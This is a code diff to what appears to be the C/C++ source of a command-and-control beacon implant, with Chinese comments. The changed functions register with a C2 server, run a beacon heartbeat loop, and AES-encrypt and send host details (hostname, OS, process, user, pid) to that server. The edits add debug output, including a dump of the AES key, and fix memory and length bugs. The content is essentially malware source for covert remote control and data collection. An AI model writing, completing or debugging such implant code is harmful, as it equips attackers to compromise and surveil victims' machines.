@@ -157,6 +157,7 @@ void sockSend(char *buf, int len) {
 char msgEncrypt[4096];
 void PostBreath() {
     while(true) {
+        printf("try to breath\n");
         Sleep(config.sleep);
         connectSocket();
         Queue node = outQueue();
@@ -173,16 +174,17 @@ void PostBreath() {
                 buf[len + i] = msgEncrypt[i];
             }
             len += msgLen;
+            free(node->message);
+            free(node);
         }
-        free(node->message);
-        free(node);
+        
         sockSend(buf, len);
         TOTAL_PRINTF("send %d bytes\n", len);
         Receive200OK();
     }
 }
-#define RandomU128 Uint128((size_t)(rand()) << 32 | rand(), (size_t)(rand()) << 32 | rand())
 const char *info = "{\"mtdt\":{\"h_name\":\"Desktop-win-99k2\", \"wver\":\"windows 10\", \"arch\":\"x86-64\", \"p_name\":\"D://beacon.exe\", \"uid\":\"admin\", \"pid\":\"9871\"}}";
+#define RandomU128 Uint128((size_t)(rand()) << 32 | rand(), (size_t)(rand()) << 32 | rand())
 void registerC2() {
     int i;
     int base64Len;
@@ -224,7 +226,6 @@ void registerC2() {
     free(base64);
     free(encryptA);
 
-
     // Step.2 接收 C2 发回的 200 OK，查看其中是否存在 0xbeebeebe
     TOTAL_PRINTF("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
     RECV_BUF
@@ -254,6 +255,8 @@ void registerC2() {
     TOTAL_PRINTF("as hex = ");
     a_b1.printHex();
     TOTAL_PRINTF("\n");
+
+    Sleep(config.sleep);
     connectSocket();
     sockSend(buf, len);
 
@@ -277,16 +280,26 @@ void registerC2() {
 
 
     // Step.5 提交宿主机信息
-    TOTAL_PRINTF("Step.5 Post info of the computer.\n");
+    TOTAL_PRINTF("\nStep.5 Post info of the computer.\n");
     char buf2[1024];
-    len = strlen(info);
-    memmove(buf, info, len);
-    aes.EncryptData((PBYTE)buf2, &len);
-    int httpLen = sprintf(buf, httpPostHead, len, temp)- 1;
+    for(len = 0; info[len] != '\x00'; len++) {
+        buf2[len] = info[len];
+    }
+    len++;
+    hexDump((PBYTE)buf2, len);
+    globalAES->EncryptData((PBYTE)buf2, &len);
+    printf("\nencrypt data = \n");
+    hexDump((PBYTE)buf2, len);
+    printf("\nAES key = \n");
+    hexDump(globalAES->g_Key, 176);
+
+    int httpLen = sprintf(buf, httpPostHead, len, temp) - 1;
     for(i = 0; i < len; i++) {
         buf[httpLen + i] = buf2[i];
     }
+    httpLen += len;
+    Sleep(config.sleep);
     connectSocket();
-    sockSend(buf, len);
+    sockSend(buf, httpLen);
     CLOSE_SOCK
 }
